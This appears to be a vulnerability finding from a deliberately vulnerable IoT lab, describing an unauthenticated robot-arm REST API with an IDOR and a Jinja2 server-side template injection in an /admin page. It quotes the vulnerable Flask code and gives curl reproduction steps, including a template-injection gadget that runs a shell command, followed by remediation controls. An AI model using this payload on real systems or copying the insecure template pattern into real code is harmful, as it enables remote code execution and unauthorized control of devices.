---
id: IoT:I3
title: "Insecure Ecosystem Interfaces"
category: IoT
status: IN PROGRESS
severity: High
owasp: "IoT I3 - Insecure Ecosystem Interfaces"
cwe: "CWE-306 (Missing Authentication) / CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-1336 (Server-Side Template Injection) / CWE-79 (Cross-site Scripting)"
source_docs:
  - "src/docs/OctoBot/OPENWRT_INTEGRATION.md §5, §7 (IoT:I3)"
  - "stages/01_spec/output/octobot-spec.md"
  - "stages/02_implement/output/manifest.md"
affected_components:
  - "labs/octobot/files/opt/octobot/octobot_gateway.py"
verified_date: ""
---

## Why It Matters

The web/REST HMI on `:8090` is the ecosystem interface between operators, the mobile app, and the arm. It exposes movement and admin functions with no authentication, lets the caller address any servo by index, and renders attacker-controlled input as a server-side template. A browser on the LAN can move the arm, and the `/admin` page is a Server-Side Template Injection sink that escalates to code execution in the gateway process.

## Root Cause

```python
# labs/octobot/files/opt/octobot/octobot_gateway.py
@app.route('/api/move')                     # [IoT:I3] no auth, [IoT:I8] no rate limit
def move():
    servo = request.args.get('servo', '0')  # [IoT:I3] IDOR: any servo index accepted
    angle = request.args.get('angle', '90')
    bus_send(f'S{servo}:{angle}')

@app.route('/admin')                        # [IoT:I3] SSTI/XSS: user input compiled as template
def admin():
    msg = request.args.get('msg', '')
    tmpl = ('<!doctype html><h1>OctoBot HMI - Cell 01</h1>'
            '<p>' + msg + '</p>' ...)
    return render_template_string(tmpl)
```

`/api/move` has no auth decorator and trusts the `servo` parameter as a direct index (IDOR). `/admin` concatenates the `msg` query parameter into a template string passed to `render_template_string`, so Jinja2 evaluates attacker input.

## Steps to Reproduce

```bash
# No-auth actuation
curl -s 'http://192.168.2.1:8090/api/move?servo=0&angle=10'
# -> {"ok": true, "sent": "S0:10"}

# IDOR: address any servo (e.g. the claw) by index
curl -s 'http://192.168.2.1:8090/api/move?servo=3&angle=5'

# SSTI: payload evaluated server-side
curl -s 'http://192.168.2.1:8090/admin?msg={{7*7}}'
# -> response contains <p>49</p>

# SSTI can escalate to RCE via a Jinja2 gadget (exact gadget is version-dependent), e.g.
curl -s --data-urlencode "msg={{ cycler.__init__.__globals__.os.popen('id').read() }}" -G http://192.168.2.1:8090/admin
```

## Expected Result

`/api/move` actuates with no auth, any `servo` index is accepted, and `/admin?msg={{7*7}}` returns `49` in the body, confirming template evaluation.

## How It Should Be

Require authentication and per-action authorization on the REST API, validate `servo` against a fixed allow-list, and never build templates from user input. Render `msg` as data with autoescaping (a static template plus a context variable), not as template source.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Auth | Session/token on all `/api/*` and `/admin` | No anonymous control |
| Authz | Allow-list servo indices and angle ranges | Kill the IDOR |
| Output | Static template + autoescaped context var | Eliminate SSTI/XSS |

## Verification Checklist

- [ ] `GET /api/move` works with no credentials
- [ ] Arbitrary `servo` index is accepted (IDOR)
- [ ] `GET /admin?msg={{7*7}}` renders `49`
- [ ] SSTI gadget evaluates server-side (RCE escalation is Jinja2-version dependent)
